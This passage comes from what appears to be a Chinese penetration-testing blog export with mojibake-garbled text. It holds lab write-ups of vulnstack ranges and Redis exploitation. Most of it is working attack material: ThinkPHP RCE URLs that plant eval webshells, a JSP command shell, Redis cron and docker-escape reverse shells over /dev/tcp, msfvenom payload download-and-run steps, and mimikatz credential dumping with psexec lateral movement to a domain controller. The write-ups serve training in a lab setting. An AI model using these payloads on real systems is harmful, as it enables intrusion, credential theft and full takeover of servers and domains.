</span><br><span class="line">[200][text/plain][24.00b] http://192.168.135.150/robots.txt    </span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æŠ¥é”™é¡µé¢å¯ä»¥å‘ç°ä¸ºthinkphp V5.0.22</p>
<p>æ‰«åˆ°ä¸€ä¸ªå¤§é©¬  <code>http://192.168.135.150/add.php</code> ä½†æ˜¯ä¸çŸ¥é“å¯†ç å¤šå°‘</p>
<p><img src="/posts/4f399e45/dama.png"></p>
<h3 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h3><p>è®¿é—®80ç«¯å£ ç‰ˆæœ¬ä¸º thinkphp  V5.0.22</p>
<p>POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># whoami</span><br><span class="line">http://192.168.135.150/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line"># phpinfo</span><br><span class="line">http://192.168.135.150/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"># pwd</span><br><span class="line">http://192.168.135.150/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=powershell%20pwd</span><br><span class="line"># å†™ä¸€å¥è¯</span><br><span class="line"># å¦‚æœæ˜¯linuxä½¿ç”¨echoå†™å…¥æ–‡ä»¶ å¦‚æœæ˜¯winä½¿ç”¨file_put_contentså†™å…¥</span><br><span class="line"># ?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20^%3C?php%20@eval($_GET[%22pass%22])?^%3E%3Eshell.php</span><br><span class="line"># ?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=%3C%3Fphp%20eval(%24_POST%5B&#x27;pass&#x27;%5D)%3B%3F%3E</span><br><span class="line">http://192.168.135.150/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=%3C%3Fphp%20eval(%24_POST[%27shell%27])%3B%3F%3E</span><br></pre></td></tr></table></figure>

<p>ç„¶åä½¿ç”¨èšå‰‘è¿æ¥ </p>
<p><img src="/posts/4f399e45/ant_shell.png"></p>
<p>å‘ç°æ˜¯adminæƒé™</p>
<h3 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h3><p>ä¸Šçº¿CS ä¸ºadministratoræƒé™</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿¡æ¯æ•´ç†</span><br><span class="line">win7</span><br><span class="line">ip 192.168.138.136(å†…ç½‘)  192.168.135.150(å¤–ç½‘)   DCip 192.168.138.138</span><br><span class="line">åŸŸ sun.com</span><br><span class="line">è¡¥ä¸      [01]: KB2534111</span><br><span class="line">          [02]: KB2999226</span><br><span class="line">          [03]: KB976902</span><br><span class="line">http://bugs.hacking8.com/tiquan/</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿›è¡Œææƒï¼Œä½†è¿™é‡Œä½¿ç”¨ms15-051 å’Œ ms14-058éƒ½æ²¡æˆåŠŸ</p>
<p>ä½¿ç”¨CS run mimikatz  è¯»å–åˆ°äº†Administrator å’Œ leo çš„å¯†ç </p>
<p><img src="/posts/4f399e45/logonpassword.png"></p>
<p>æ‰«æä¸€ä¸‹å†…ç½‘ä¸­çš„ä¸»æœº 445 </p>
<p><code>portscan 192.168.138.0/24 445 arp 50</code></p>
<p>å°è¯•ä½¿ç”¨æŠ“åˆ°çš„leoç”¨æˆ· è¿›è¡Œpsexec</p>
<p><img src="/posts/4f399e45/psexec_win_system.png"></p>
<p>å¾—åˆ°win7 systemæƒé™</p>
<p>ç”±äºDCä¸å‡ºç½‘ä½¿ç”¨win7ä½œä¸ºè·³æ¿æœºå»ºç«‹Listener </p>
<p><img src="/posts/4f399e45/neiwang1.png"></p>
<p><img src="/posts/4f399e45/neiwang2.png"></p>
<p>ç„¶åé€šè¿‡psexec ä¸Šçº¿DC å¾—åˆ°DCæœºå™¨çš„systemå…¨æ¯</p>
<p><img src="/posts/4f399e45/dc_psexec1.png"></p>
<p><img src="/posts/4f399e45/dc_psexec2.png"></p>
<p><img src="/posts/4f399e45/dc_system.png"></p>
<p><img src="/posts/4f399e45/tuopu.png"></p>
<p>run mimikatz çœ‹ä¸‹dcæœºå™¨çš„å¯†ç </p>
<p><img src="/posts/4f399e45/dc_passwd.png"></p>
]]></content>
      <categories>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>vulnstack</tag>
      </tags>
  </entry>
  <entry>
    <title>redisRCEå¤ç°</title>
    <url>/posts/27814dfe/</url>
    <content><![CDATA[<h3 id="redis4-x-5-x-RCE"><a href="#redis4-x-5-x-RCE" class="headerlink" title="redis4.x/5.x RCE"></a>redis4.x/5.x RCE</h3><h4 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h4><p>4.x-5.x</p>
<h4 id="ä¸»ä»æ¨¡å¼"><a href="#ä¸»ä»æ¨¡å¼" class="headerlink" title="ä¸»ä»æ¨¡å¼"></a>ä¸»ä»æ¨¡å¼</h4><p>ä¸»ä»æ¨¡å¼å°±æ˜¯æŒ‡ä½¿ç”¨ä¸€ä¸ªrediså®ä¾‹ä½œä¸ºä¸»æœºï¼Œå…¶ä»–å®ä¾‹éƒ½ä½œä¸ºå¤‡ä»½æœºï¼Œå…¶ä¸­ä¸»æœºå’Œä»æœºæ•°æ®ç›¸åŒï¼Œè€Œä»æœºåªè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™ï¼Œé€šè¿‡è¯»å†™åˆ†ç¦»å¯ä»¥å¤§å¹…åº¦å‡è½»æµé‡çš„å‹åŠ›ï¼Œç®—æ˜¯ä¸€ç§é€šè¿‡ç‰ºç‰²ç©ºé—´æ¥æ¢å–æ•ˆç‡çš„ç¼“è§£æ–¹å¼ã€‚</p>
<h4 id="redisæ¨¡å—"><a href="#redisæ¨¡å—" class="headerlink" title="redisæ¨¡å—"></a>redisæ¨¡å—</h4><p>åœ¨Reids 4.xä¹‹åï¼ŒRedisæ–°å¢äº†æ¨¡å—åŠŸèƒ½ï¼Œé€šè¿‡å¤–éƒ¨æ‹“å±•ï¼Œå¯ä»¥å®ç°åœ¨redisä¸­å®ç°ä¸€ä¸ªæ–°çš„Rediså‘½ä»¤ï¼Œé€šè¿‡å†™cè¯­è¨€å¹¶ç¼–è¯‘å‡º.soæ–‡ä»¶ã€‚</p>
<h4 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h4><p>åœ¨ä¸¤ä¸ªRediså®ä¾‹è®¾ç½®ä¸»ä»æ¨¡å¼çš„æ—¶å€™ï¼ŒRedisçš„ä¸»æœºå®ä¾‹å¯ä»¥é€šè¿‡FULLRESYNCåŒæ­¥æ–‡ä»¶åˆ°ä»æœºä¸Šã€‚ç„¶ååœ¨ä»æœºä¸ŠåŠ è½½soæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œæ‹“å±•çš„æ–°å‘½ä»¤äº†ã€‚</p>
<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ä¸‹è½½redis</span><br><span class="line">wget http://download.redis.io/releases/redis-5.0.0.tar.gz</span><br><span class="line">tar -xvzf redis-5.0.0.tar.gz</span><br><span class="line">cd redis-5.0.0</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"># æ›´æ”¹é…ç½®æ–‡ä»¶</span><br><span class="line">cd redis-5.0.0</span><br><span class="line">vim redis.conf</span><br><span class="line">      protected-mode yes æ”¹ä¸ºprotected-mode no</span><br><span class="line">      bind 127.0.0.1 æ”¹ä¸º bind 0.0.0.0</span><br><span class="line"></span><br><span class="line"># å¯åŠ¨redis</span><br><span class="line">cd src</span><br><span class="line">./redis-server ../redis.conf   # åŠ è½½æŒ‡å®šé…ç½®</span><br><span class="line"></span><br><span class="line"># å…³é—­é˜²ç«å¢™</span><br><span class="line">systemctl stop firewalld </span><br></pre></td></tr></table></figure>

<h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>expä¸‹è½½ <code>https://github.com/n0b0dyCN/redis-rogue-server</code></p>
<p>ç”¨æ³•:<code>python3 redis-rogue-server.py --rhost=192.168.0.182 --lhost=192.168.0.128 --exp=exp.so</code></p>
<p>-r åå¼¹shell  -i å®æ—¶shell</p>
<p><img src="/posts/27814dfe/exp_i.png"></p>
<p><img src="/posts/27814dfe/exp.png"></p>
<p><img src="/posts/27814dfe/shell.png"></p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a></p>
<p><a href="http://www.feidao.site/wordpress/?p=2090">http://www.feidao.site/wordpress/?p=2090</a></p>
<p><a href="https://blog.csdn.net/weixin_43252204/article/details/115181128">https://blog.csdn.net/weixin_43252204/article/details/115181128</a></p>
</blockquote>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>redisæœªæˆæƒè®¿é—®æ¼æ´å¤ç°</title>
    <url>/posts/19a78c2/</url>
    <content><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>Redis é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œè¿™æ ·å°†ä¼šå°† Redis æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆé»˜è®¤ä¸ºç©ºï¼‰çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—® Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ï¼Œæ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—® Redis çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ Redis è‡ªèº«çš„æä¾›çš„config å‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œã€‚</p>
<p>å½±å“ç‰ˆæœ¬ï¼šRedis 2.xï¼Œ3.xï¼Œ4.xï¼Œ5.xã€‚ä½†æ˜¯åœ¨Redis3.2ä¹‹åå¢åŠ äº†<strong>protected-mode</strong>å®‰å…¨æ¨¡å¼ï¼Œé»˜è®¤å¼€å¯ï¼Œä¸”ç»‘å®šäº†æœ¬åœ°IP</p>
<p>æ‰€ä»¥æƒ³è¦å¤ç°éœ€è¦æ›´æ”¹é…ç½®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind 127.0.0.1 =&gt; bind 0.0.0.0  //å¼€å¯è¿œç¨‹è®¿é—®</span><br><span class="line">protected-mode yes =&gt; protested-mode no</span><br></pre></td></tr></table></figure>

<p>ä¸ºäº†æ–¹ä¾¿é€‰æ‹©ä½¿ç”¨3.2ç‰ˆæœ¬ä¹‹å‰çš„Redisï¼šRedis-2.8.17ï¼Œä¸éœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶å³å¯å¤ç°</p>
<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>centos7 ï¼ˆ192.168.0.182ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ä¸‹è½½redis-2.8.17</span><br><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br><span class="line"></span><br><span class="line"># è§£å‹å‹ç¼©åŒ… ç¼–è¯‘å®‰è£…</span><br><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line">cd redis-2.8.17</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"># redis.confæ‹·è´åˆ°/etcä¸‹é¢</span><br><span class="line">cp redis.conf /etc/redis.conf</span><br><span class="line"></span><br><span class="line"># å°†redis-serverå’Œredis-cliæ‹·è´åˆ°/usr/binç›®å½•ä¸‹ï¼Œæ–¹ä¾¿ç›´æ¥å¯åŠ¨redisæœåŠ¡å™¨</span><br><span class="line">cd src</span><br><span class="line">cp redis-server /usr/bin</span><br><span class="line">cp redis-cli /usr/bin</span><br><span class="line"></span><br><span class="line"># å¯åŠ¨æœåŠ¡</span><br><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ç”±äºæ˜¯åœ¨æœ¬åœ°æ­å»ºçš„ï¼Œæ²¡æœ‰å¼€å¯6379ç«¯å£å¯¹å¤–å¼€æ”¾ï¼Œæ‰€æœ‰å…ˆåœ¨centosä¸Šå…ˆå…³é—­é˜²ç«å¢™ </span><br><span class="line">systemctl stop firewalld.service</span><br><span class="line">systemctl disable firewalld.service</span><br><span class="line">systemctl status firewalld.service</span><br></pre></td></tr></table></figure>

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>ä½¿ç”¨kaliè¿œç¨‹è¿æ¥redis</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.163.132</span><br></pre></td></tr></table></figure>

<h4 id="å†™å…¥webshell"><a href="#å†™å…¥webshell" class="headerlink" title="å†™å…¥webshell"></a>å†™å…¥webshell</h4><p>æ¡ä»¶</p>
<ul>
<li>æˆåŠŸè¿æ¥redisæœåŠ¡å™¨</li>
<li>çŸ¥é“webæ ¹ç›®å½•çš„ç»å¯¹è·¯å¾„</li>
<li>redisæœåŠ¡å™¨ç”¨æˆ·æœ‰å†™å…¥æƒé™</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">192.168.0.182:6379&gt; set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p><img src="/posts/19a78c2/shell.png"></p>
<h4 id="å†™å…¥sshå…¬é’¥è¿œç¨‹è¿æ¥"><a href="#å†™å…¥sshå…¬é’¥è¿œç¨‹è¿æ¥" class="headerlink" title="å†™å…¥sshå…¬é’¥è¿œç¨‹è¿æ¥"></a>å†™å…¥sshå…¬é’¥è¿œç¨‹è¿æ¥</h4><p>1.kali æœ¬åœ°ç”Ÿæˆsshå…¬é’¥</p>
<p><code>ssh-keygen -t rsa</code></p>
<p>2.è¿›å…¥.sshç›®å½•ï¼Œå°†å…¬é’¥å†™å…¥1.txt</p>
<p><code>cd /root/.ssh</code></p>
<p><code>(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; 1.txt</code></p>
<p><img src="/posts/19a78c2/1_txt.png"></p>
<p>3.å°†1.txtå†™å…¥é¶æœº</p>
<p><code> cat 1.txt | redis-cli -h 192.168.0.182 -x set crack</code></p>
<p>4.è¿œç¨‹ç™»å½•é¶æœºredisæœåŠ¡</p>
<p><code>redis-cli -h 192.168.0.182</code></p>
<p>5.æ›´æ”¹rediså¤‡ä»½è·¯å¾„ä¸ºsshå…¬é’¥å­˜æ”¾ç›®å½•ï¼ˆä¸€èˆ¬é»˜è®¤ä¸º/root/.sshï¼‰,è®¾ç½®ä¸Šä¼ å…¬é’¥çš„å¤‡ä»½æ–‡ä»¶åå­—ä¸ºauthorized_keysï¼Œsaveä¿å­˜</p>
<p><code>CONFIG GET dir</code></p>
<p><code>config set dir /root/.ssh</code> </p>
<p><code>CONFIG SET dbfilename authorized_keys</code></p>
<p><code>CONFIG GET dbfilename</code> æ£€æŸ¥æ˜¯å¦æœ‰authorized_keysæ–‡ä»¶</p>
<p><code>save</code></p>
<p><img src="/posts/19a78c2/save_file.png"></p>
<p>6.sshè¿æ¥é¶æœº</p>
<p><code>ssh -i id_rsa root@192.168.0.182</code></p>
<p>ç™»å½•æˆåŠŸ</p>
<p><img src="/posts/19a78c2/ssh_conn.png"></p>
<h4 id="åˆ©ç”¨crontabåå¼¹shell"><a href="#åˆ©ç”¨crontabåå¼¹shell" class="headerlink" title="åˆ©ç”¨crontabåå¼¹shell"></a>åˆ©ç”¨crontabåå¼¹shell</h4><p>kaliä½¿ç”¨ncç›‘å¬ç«¯å£</p>
<p><code>nc -lvvp 5555</code></p>
<p>kaliè¿æ¥redisæœåŠ¡</p>
<p><code>redis-cli -h 192.168.0.182</code></p>
<p>å‘æœåŠ¡å™¨å†™å…¥æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.0.128/5555 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹nc æ˜¯å¦åå¼¹åˆ°shell</p>
<p><img src="/posts/19a78c2/nc_shell.png"></p>
<h3 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h3><ul>
<li><p>ç¦ç”¨é«˜å±å‘½ä»¤ï¼Œå¦‚è¿œç¨‹ä¿®æ”¹ DB æ–‡ä»¶åœ°å€</p>
</li>
<li><p>é€‰æ‹©ä½¿ç”¨åœ°æƒé™è¿è¡ŒredisæœåŠ¡ï¼Œä¸”ç¦æ­¢è¿œç¨‹ç™»å½•</p>
</li>
<li><p>è®¾ç½®RedisæœåŠ¡å¯†ç ï¼Œæˆ–æ˜¯ç»‘å®šæœ¬åœ°IPï¼š127.0.0.1</p>
</li>
</ul>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="http://www.feidao.site/wordpress/?p=2090">www.feidao.site/wordpress/?p=2090</a></p>
<p><a href="https://www.freebuf.com/vuls/248207.html">https://www.freebuf.com/vuls/248207.html</a></p>
<p><a href="https://www.freebuf.com/vuls/223432.html">https://www.freebuf.com/vuls/223432.html</a></p>
<p><a href="https://www.yyxzz.net/articles/36.html">https://www.yyxzz.net/articles/36.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack4é¶åœº</title>
    <url>/posts/e94e95f1/</url>
    <content><![CDATA[<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¤–ç½‘ä½¿ç”¨NATæ¨¡å¼  å†…ç½‘ä½¿ç”¨VM3 192.168.181.0/24</span><br><span class="line">Ubuntu(ubuntu)      192.168.183.129     192.168.0.180 </span><br><span class="line">DC(Dotest123)       192.168.183.130</span><br><span class="line">Win7(Test2021)      192.168.183.128</span><br></pre></td></tr></table></figure>

<p>å¼€å¯webæœºå™¨(ubuntu)çš„dokcerå®¹å™¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/ubuntu/Desktop/vulhub/struts2/s2-045</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">cd /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615/</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">cd /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613/</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"></span><br><span class="line">sudo docker ps  </span><br></pre></td></tr></table></figure>

<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p><code>sudo nmap 192.168.0.180 -sT -Pn -sV </code></p>
<p><img src="/posts/e94e95f1/namp.png"></p>
<p>å¼€æ”¾äº† 22 2001 2002 2003 ç«¯å£</p>
<p>åˆ†åˆ«è®¿é—®äº†ä¸‹2001ï¼Œ2002ï¼Œ2003ç«¯å£</p>
<p>2001    structs2</p>
<p>2002    tomcat</p>
<p>2003    phpmyadmin4.8.1</p>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><h4 id="phpmyadmin-CVE-2018-12613"><a href="#phpmyadmin-CVE-2018-12613" class="headerlink" title="phpmyadmin CVE-2018-12613"></a>phpmyadmin CVE-2018-12613</h4><p>çœ‹äº†ä¸‹phpmyadminçš„ç‰ˆæœ¬ æ˜¯4.8.1 å…ˆéªŒè¯ä¸‹æ˜¯å¦å­˜åœ¨cve-2018-12613</p>
<p><code>http://192.168.0.128:2003/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code> ç›´æ¥è¿è¡Œäº†/etc/passwd è¯´æ˜å­˜åœ¨è¯¥æ¼æ´</p>
<p><img src="/posts/e94e95f1/phpmyadmin1.png"></p>
<p>ç„¶åå°è¯•getshell</p>
<p>åœ¨sqlå¤„ æ‰§è¡Œ <code>select &#39;&lt;?php phpinfo();?&gt;&#39;</code></p>
<p><img src="/posts/e94e95f1/phpmyadmin2.png"></p>
<p>æ‰§è¡ŒæˆåŠŸåæŸ¥çœ‹ è‡ªå·±çš„sessionid  phpmyadminçš„å€¼ <code>2c8e2d642e3762699d4e070db30880b6</code></p>
<p><img src="/posts/e94e95f1/phpmyadmin_value.png"></p>
<p><code>http://192.168.0.128:2003/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_2c8e2d642e3762699d4e070db30880b6</code></p>
<p><code>http://192.168.0.128:2003/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_7f9c04b6ead4e844459d4ec29658e424</code></p>
<p>æˆåŠŸæ‰§è¡Œä¹‹å‰åœ¨sqlå¤„çš„phpinfoå‘½ä»¤</p>
<p><img src="/posts/e94e95f1/phpmyadmin_phpinfo.png"></p>
<p>å†™å…¥ä¸€å¥è¯</p>
<p>å°è¯•å‡ ä¸ªä¸€å¥è¯éƒ½å†™å…¥å¤±è´¥äº†ï¼Œå†™å…¥åä¼šæŠ¥é”™ï¼Œå¯èƒ½æ˜¯å› ä¸ºdockerçš„åŸå› </p>
<p><img src="/posts/e94e95f1/phpmyadmin_shell_error.png"></p>
<h4 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h4><p><img src="/posts/e94e95f1/struts2_1.png"></p>
<p><img src="/posts/e94e95f1/struts2_2.PNG"></p>
<p>å¯ä»¥åˆ¤æ–­æ˜¯dockerå®¹å™¨</p>
<p>ä¸Šä¼ jsp shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;</span><br><span class="line"> &lt;%</span><br><span class="line"> %&gt;</span><br><span class="line"> &lt;HTML&gt;&lt;BODY&gt;</span><br><span class="line"> &lt;FORM METHOD=&quot;POST&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;</span><br><span class="line"> &lt;INPUT TYPE=&quot;text&quot; NAME=&quot;cmd&quot;&gt;</span><br><span class="line"> &lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;</span><br><span class="line"> &lt;/FORM&gt;</span><br><span class="line"> &lt;pre&gt;</span><br><span class="line"> &lt;%</span><br><span class="line"> if (request.getParameter(&quot;cmd&quot;) != null) &#123;</span><br><span class="line">    </span><br><span class="line">         out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;\n&lt;BR&gt;&quot;);</span><br><span class="line">         Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));</span><br><span class="line">         OutputStream os = p.getOutputStream();</span><br><span class="line">         InputStream in = p.getInputStream();</span><br><span class="line">         DataInputStream dis = new DataInputStream(in);</span><br><span class="line">         String disr = dis.readLine();</span><br><span class="line">         while ( disr != null ) &#123;</span><br><span class="line">    </span><br><span class="line">                 out.println(disr); disr = dis.readLine(); &#125;</span><br><span class="line">         &#125;</span><br><span class="line"> %&gt;</span><br><span class="line"> &lt;/pre&gt;</span><br><span class="line"> &lt;/BODY&gt;&lt;/HTML&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/e94e95f1/struts2_shell.png"></p>
<h4 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h4><p>ä½¿ç”¨kaliçš„searchsploitæœç´¢tomcatçš„pocï¼Œè¿™é‡Œtomcatç‰ˆæœ¬æ˜¯8.5</p>
<p><code>searchsploit tomcat 8.5.19</code></p>
<p><img src="/posts/e94e95f1/searchsploit_tomcat.png"></p>
<p><code>searchsploit -m jsp/webapps/42966.py</code></p>
<p><code>sudo python2 42966.py -u http://192.168.0.180:2002</code></p>
<p><code>sudo python2 42966.pu -u http://192.168.0.180:2002 -p pwn</code></p>
<p>è®¿é—®<code>http://192.168.0.180:2002/pwn.jsp</code></p>
<p><img src="/posts/e94e95f1/tomcat_shell_whoami.png"></p>
<p>åˆ¤æ–­æ˜¯dockerç¯å¢ƒ<code>ls -alh /.dockerenv</code>  <code>cat /proc/1/cgroup</code></p>
<h4 id="ä¸Šçº¿msf"><a href="#ä¸Šçº¿msf" class="headerlink" title="ä¸Šçº¿msf"></a>ä¸Šçº¿msf</h4><p>ç”Ÿæˆmsfé©¬</p>
<p><code> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.128 LPORT=4444 -f elf &gt; shell.elf</code></p>
<p>kaliå¼€å¯httpæœåŠ¡</p>
<p><code>sudo python3 -mhttp.server 9999</code></p>
<p>åœ¨ä¸Šä¼ çš„pwn.jspé€šè¿‡wgetä¸‹è½½msf</p>
<p><code>wget http://192.168.0.128:9999/shell.elf</code></p>
<p><code>chmod 777 shell.elf</code></p>
<p><code>./shell.elf</code></p>
<p>msfå¼€å¯ç›‘å¬</p>
<p><code>use exploit/multi/handler</code></p>
<p><code>set payload  linux/x86/meterpreter/reverse_tcp</code></p>
<p><code>set lhost 192.168.0.128</code></p>
<p><code>set lport 4444</code></p>
<p><code>run</code></p>
<p>æˆåŠŸåå¼¹åˆ°shell</p>
<p><img src="/posts/e94e95f1/msf_shell.png"></p>
<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><h4 id="åˆ©ç”¨CVE-2019-5736è¿›è¡Œdockeré€ƒé€¸"><a href="#åˆ©ç”¨CVE-2019-5736è¿›è¡Œdockeré€ƒé€¸" class="headerlink" title="åˆ©ç”¨CVE-2019-5736è¿›è¡Œdockeré€ƒé€¸"></a>åˆ©ç”¨CVE-2019-5736è¿›è¡Œdockeré€ƒé€¸</h4><p>payloadä¸‹è½½åœ°å€ <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
<p>ä¸‹è½½å¹¶ç¼–è¯‘main,go ä¿®æ”¹payloadæ›¿æ¢ä¸ºåå¼¹shell </p>
<p><code>var payload = &quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/192.168.0.128/5555 0&gt;&amp; 1&quot;</code></p>
<p>ç¼–è¯‘ç”Ÿæˆgoæ–‡ä»¶</p>
<p><code> CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</code></p>
<p>é€šè¿‡msfå°†ç”Ÿæˆçš„main.goä¸Šä¼ åˆ°é¶æœº</p>
<p><code>upload ~/æ¡Œé¢/CVE-2019-5736-PoC /home</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home </span><br><span class="line">chmod /main</span><br><span class="line">cd /main</span><br><span class="line">./main.go</span><br></pre></td></tr></table></figure>

<p>åœ¨æ‰§è¡Œå‰å…ˆåœ¨kaliä¸Šå¼€å¯ç›‘å¬</p>
<p><code>nc -lvvp 5555</code></p>
<p>ä½†æ˜¯ç”±äºéœ€è¦å®¿ä¸»æœºæ‰§è¡Œå‘½ä»¤ æ‰èƒ½å»è§¦å‘payloadåå¼¹shell</p>
